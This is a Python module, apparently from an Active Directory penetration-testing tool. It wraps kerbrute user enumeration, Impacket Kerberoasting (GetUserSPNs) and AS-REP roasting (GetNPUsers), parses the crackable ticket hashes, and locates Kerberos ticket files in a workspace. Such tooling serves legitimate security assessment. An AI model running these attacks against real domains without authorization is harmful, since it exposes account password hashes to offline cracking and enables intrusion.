"""Kerberos enumeration mixin.

This module provides Kerberos-focused enumeration operations including:
- Ticket artifact discovery (ccache, kirbi, keytab)
- Kerberoasting (TGS-REP attacks via GetUserSPNs)
- AS-REP Roasting (via GetNPUsers)

These operations integrate with Impacket tools and can run in both
authenticated and unauthenticated modes.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Optional, List
import logging
import subprocess
import shlex
import re

from adscan_internal.core import AuthMode, requires_auth
from adscan_internal.command_runner import CommandSpec, default_runner
from adscan_internal.subprocess_env import (
    command_string_needs_clean_env,
    get_clean_env_for_compilation,
)
from adscan_internal.integrations.impacket import (
    ImpacketRunner,
    ImpacketContext,
    parse_kerberoast_output,
    parse_asreproast_output,
    KerberoastHash,
    ASREPHash,
)


logger = logging.getLogger(__name__)


CommandExecutor = Callable[[str, int], subprocess.CompletedProcess[str]]


def _default_executor(command: str, timeout: int) -> subprocess.CompletedProcess[str]:
    """Execute a command using the shared command runner.

    Args:
        command: Command string to execute.
        timeout: Timeout in seconds.

    Returns:
        Completed process result.
    """
    use_clean_env = command_string_needs_clean_env(command)
    cmd_env = get_clean_env_for_compilation() if use_clean_env else None
    return default_runner.run(
        CommandSpec(
            command=command,
            timeout=timeout,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
            env=cmd_env,
        )
    )


@dataclass(frozen=True)
class KerberosTicketArtifact:
    """Kerberos ticket artefact discovered in a workspace.

    Attributes:
        principal: Optional principal inferred from filename or metadata.
        path: Absolute path to the artefact.
        kind: Artefact kind (ccache/kirbi/keytab/unknown).
    """

    principal: Optional[str]
    path: Path
    kind: str


class KerberosEnumerationMixin:
    """Kerberos enumeration operations.

    This mixin is composed by :class:`adscan_internal.services.enumeration.EnumerationService`.
    """

    def __init__(self, parent_service):
        """Initialize Kerberos enumeration mixin.

        Args:
            parent_service: Parent EnumerationService instance.
        """
        self.parent = parent_service
        self.logger = parent_service.logger

    @requires_auth(AuthMode.AUTHENTICATED)
    def discover_ticket_artifacts(
        self,
        workspace_dir: str,
        domain: str,
        *,
        scan_id: Optional[str] = None,
    ) -> list[KerberosTicketArtifact]:
        """Discover Kerberos ticket artefacts within the workspace.

        This searches common locations like:
        - ``<workspace>/domains/<domain>/kerberos/tickets`` (new layout)
        - ``<workspace>/domains/<domain>/kerberos`` (legacy layout)

        Args:
            workspace_dir: Workspace root directory.
            domain: Target domain name.
            scan_id: Optional scan id for progress emission.

        Returns:
            List of ticket artefacts discovered.
        """
        root = Path(workspace_dir).expanduser().resolve()
        tickets_root = root / "domains" / domain / "kerberos"
        candidates = [
            tickets_root / "tickets",
            tickets_root,
        ]

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_artifacts",
            progress=0.0,
            message=f"Searching Kerberos artefacts for {domain}",
        )

        artifacts: list[KerberosTicketArtifact] = []
        for directory in candidates:
            if not directory.exists() or not directory.is_dir():
                continue
            artifacts.extend(self._scan_ticket_dir(directory))

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_artifacts",
            progress=1.0,
            message=f"Kerberos artefact discovery completed: {len(artifacts)} found",
        )
        return artifacts

    def _scan_ticket_dir(self, directory: Path) -> list[KerberosTicketArtifact]:
        """Scan a directory for ticket artefacts.

        Args:
            directory: Directory to scan.

        Returns:
            List of artifacts.
        """
        artifacts: list[KerberosTicketArtifact] = []
        for path in directory.rglob("*"):
            if not path.is_file():
                continue

            kind = self._infer_ticket_kind(path)
            if kind == "unknown":
                continue

            principal = self._infer_principal(path)
            artifacts.append(
                KerberosTicketArtifact(
                    principal=principal,
                    path=path.resolve(),
                    kind=kind,
                )
            )
        return artifacts

    @staticmethod
    def _infer_ticket_kind(path: Path) -> str:
        """Infer artefact kind from filename suffix."""
        suffix = path.suffix.lower()
        if suffix in (".ccache", ".cache"):
            return "ccache"
        if suffix == ".kirbi":
            return "kirbi"
        if suffix == ".keytab":
            return "keytab"
        return "unknown"

    @staticmethod
    def _infer_principal(path: Path) -> Optional[str]:
        """Best-effort principal inference from filename.

        We intentionally keep this heuristic minimal to avoid false positives.
        """
        name = path.name
        if "@" in name:
            # Example: administrator@domain.ccache
            return name.split("@", 1)[0]
        return None

    @requires_auth(AuthMode.UNAUTHENTICATED)
    def enumerate_users_kerberos(
        self,
        domain: str,
        pdc: str,
        *,
        wordlist: str,
        kerbrute_path: str,
        output_file: Path,
        executor: CommandExecutor | None = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,
    ) -> List[str]:
        """Enumerate users via Kerberos without LDAP access.

        This method wraps ``kerbrute userenum`` to perform username
        enumeration using Kerberos pre-authentication.

        The CLI is responsible for interactive wordlist selection and
        workspace layout; this helper focuses on command construction,
        execution, and parsing the resulting user list.

        Args:
            domain: Target Active Directory domain.
            pdc: Primary Domain Controller IP/hostname.
            wordlist: Path to the username wordlist.
            kerbrute_path: Full path to the ``kerbrute`` binary.
            output_file: Path where kerbrute should write its log/output.
            executor: Optional command executor, mainly for testing.
            scan_id: Optional scan identifier for progress emission.
            timeout: Command timeout in seconds.

        Returns:
            List of unique usernames (lowercase) discovered.
        """

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_user_enumeration",
            progress=0.0,
            message=f"Enumerating users via Kerberos on {domain}",
        )

        # Build kerbrute command.
        cmd = (
            f"{shlex.quote(kerbrute_path)} userenum "
            f"-d {shlex.quote(domain)} "
            f"--dc {shlex.quote(pdc)} "
            f"{shlex.quote(wordlist)} "
            f"-o {shlex.quote(str(output_file))}"
        )

        exec_fn = executor or _default_executor

        self.logger.info(
            "Executing Kerberos user enumeration",
            extra={"domain": domain, "pdc": pdc, "command": cmd},
        )

        try:
            result = exec_fn(cmd, timeout)
        except subprocess.TimeoutExpired:
            self.logger.error(
                "Kerberos user enumeration timed out",
                extra={"domain": domain, "pdc": pdc},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration timed out",
            )
            return []
        except Exception:  # pragma: no cover - defensive
            self.logger.exception(
                "Unexpected error during Kerberos user enumeration",
                extra={"domain": domain, "pdc": pdc},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration failed",
            )
            return []

        if result.returncode != 0:
            self.logger.warning(
                "Kerberos user enumeration command failed",
                extra={
                    "domain": domain,
                    "pdc": pdc,
                    "returncode": result.returncode,
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                },
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration failed",
            )
            return []

        # Parse kerbrute output file for discovered usernames.
        if not output_file.exists():
            self.logger.warning(
                "Kerberos user enumeration output file not found",
                extra={"domain": domain, "output_file": str(output_file)},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration completed with no results",
            )
            return []

        usernames: list[str] = []
        seen: set[str] = set()

        try:
            for raw_line in output_file.read_text(
                encoding="utf-8", errors="ignore"
            ).splitlines():
                line = raw_line.strip()
                if not line or "@" not in line:
                    continue

                # Kerbrute commonly prints lines like:
                #   [*] VALID USERNAME: user@domain.local
                # We perform a best-effort extraction of the `user` part.
                match = re.search(
                    rf"\b([A-Za-z0-9._$-]+)@{re.escape(domain)}\b", line, re.IGNORECASE
                )
                if not match:
                    # Fallback: look for any token containing '@'.
                    token_user: Optional[str] = None
                    for token in line.split():
                        if "@" in token:
                            token_user = token.split("@", 1)[0]
                            break
                    if not token_user:
                        continue
                    candidate = token_user
                else:
                    candidate = match.group(1)

                user = (candidate or "").strip().lower()
                if not user or user == "ronnie":
                    # Preserve original behaviour that skipped the lab author user.
                    continue
                if user in seen:
                    continue
                seen.add(user)
                usernames.append(user)
        except OSError:
            self.logger.exception(
                "Failed to read Kerberos enumeration output file",
                extra={"domain": domain, "output_file": str(output_file)},
            )
            return []

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_user_enumeration",
            progress=1.0,
            message=f"Kerberos user enumeration completed: {len(usernames)} user(s) found",
        )
        self.logger.info(
            "Kerberos user enumeration completed",
            extra={"domain": domain, "count": len(usernames)},
        )
        return usernames

    @requires_auth(AuthMode.AUTHENTICATED)
    def kerberoast(
        self,
        domain: str,
        pdc: str,
        username: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        *,
        usersfile: Optional[Path] = None,
        impacket_runner: ImpacketRunner,
        impacket_context: ImpacketContext,
        output_file: Optional[Path] = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,
    ) -> List[KerberoastHash]:
        """Perform Kerberoasting attack to extract TGS tickets.

        Executes GetUserSPNs to request TGS tickets for accounts with
        Service Principal Names (SPNs) set. The resulting tickets can
        be cracked offline to recover plaintext passwords.

        Args:
            domain: Target domain name
            pdc: Primary Domain Controller IP/hostname
            username: Username for authentication
            password: Password for authentication (optional if hashes provided)
            hashes: NTLM hashes for authentication (format: LM:NT)
            usersfile: Optional file with usernames to target (narrows roasting scope)
            impacket_runner: ImpacketRunner instance for executing GetUserSPNs
            impacket_context: ImpacketContext with paths and validation callbacks
            output_file: Optional output file for hash storage
            scan_id: Optional scan ID for progress tracking
            timeout: Command timeout in seconds

        Returns:
            List of parsed Kerberoast hash entries

        Raises:
            ValueError: If neither password nor hashes provided
        """
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting",
            progress=0.0,
            message=f"Starting Kerberoasting attack on {domain}",
        )

        if not password and not hashes:
            raise ValueError(
                "Either password or hashes must be provided for Kerberoasting"
            )

        self.logger.info(
            "Executing Kerberoasting attack",
            extra={
                "domain": domain,
                "pdc": pdc,
                "username": username,
                "has_password": bool(password),
                "has_hashes": bool(hashes),
            },
        )

        # Execute GetUserSPNs
        result = impacket_runner.run_getuserspns(
            domain=domain,
            ctx=impacket_context,
            username=username,
            password=password,
            hashes=hashes,
            request=True,
            usersfile=str(usersfile) if usersfile else None,
            outputfile=output_file,
            timeout=timeout,
        )

        if not result or not result.stdout:
            self.logger.warning("Kerberoasting returned no output")
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberoasting",
                progress=1.0,
                message="Kerberoasting completed: No hashes found",
            )
            return []

        # Parse output
        hashes_list = parse_kerberoast_output(result.stdout)

        self.logger.info(
            f"Kerberoasting completed: {len(hashes_list)} hash(es) extracted",
            extra={"domain": domain, "count": len(hashes_list)},
        )

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting",
            progress=1.0,
            message=f"Kerberoasting completed: {len(hashes_list)} hash(es) found",
        )

        return hashes_list

    def asreproast(
        self,
        domain: str,
        pdc: str,
        *,
        username: Optional[str] = None,
        password: Optional[str] = None,
        usersfile: Optional[Path] = None,
        impacket_runner: ImpacketRunner,
        impacket_context: ImpacketContext,
        output_file: Optional[Path] = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,
    ) -> List[ASREPHash]:
        """Perform AS-REP Roasting attack to find vulnerable accounts.

        Executes GetNPUsers to identify accounts that don't require
        Kerberos pre-authentication. The resulting AS-REP hashes can
        be cracked offline to recover plaintext passwords.

        This can run in two modes:
        1. Authenticated: Uses provided credentials to query LDAP for users
        2. Unauthenticated: Uses a provided users file to bruteforce

        Args:
            domain: Target domain name
            pdc: Primary Domain Controller IP/hostname
            username: Username for authenticated mode (optional)
            password: Password for authenticated mode (optional)
            usersfile: File containing usernames (required for unauthenticated mode)
            impacket_runner: ImpacketRunner instance for executing GetNPUsers
            impacket_context: ImpacketContext with paths and validation callbacks
            output_file: Optional output file for hash storage
            scan_id: Optional scan ID for progress tracking
            timeout: Command timeout in seconds

        Returns:
            List of parsed AS-REP hash entries

        Raises:
            ValueError: If neither credentials nor usersfile provided
        """
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="asreproasting",
            progress=0.0,
            message=f"Starting AS-REP Roasting attack on {domain}",
        )

        # Determine mode
        is_authenticated = bool(username and password)
        is_unauthenticated = bool(usersfile)

        if not is_authenticated and not is_unauthenticated:
            raise ValueError(
                "Either credentials (username + password) or usersfile must be provided for AS-REP Roasting"
            )

        self.logger.info(
            "Executing AS-REP Roasting attack",
            extra={
                "domain": domain,
                "pdc": pdc,
                "mode": "authenticated" if is_authenticated else "unauthenticated",
                "has_usersfile": is_unauthenticated,
            },
        )

        # Execute GetNPUsers
        result = impacket_runner.run_getnpusers(
            domain=domain,
            ctx=impacket_context,
            username=username,
            password=password,
            usersfile=usersfile,
            format="hashcat",
            outputfile=output_file,
            dc_ip=pdc,
            timeout=timeout,
        )

        if not result or not result.stdout:
            self.logger.warning("AS-REP Roasting returned no output")
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="asreproasting",
                progress=1.0,
                message="AS-REP Roasting completed: No hashes found",
            )
            return []

        # Parse output
        hashes_list = parse_asreproast_output(result.stdout)

        self.logger.info(
            f"AS-REP Roasting completed: {len(hashes_list)} hash(es) extracted",
            extra={"domain": domain, "count": len(hashes_list)},
        )

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="asreproasting",
            progress=1.0,
            message=f"AS-REP Roasting completed: {len(hashes_list)} hash(es) found",
        )

        return hashes_list
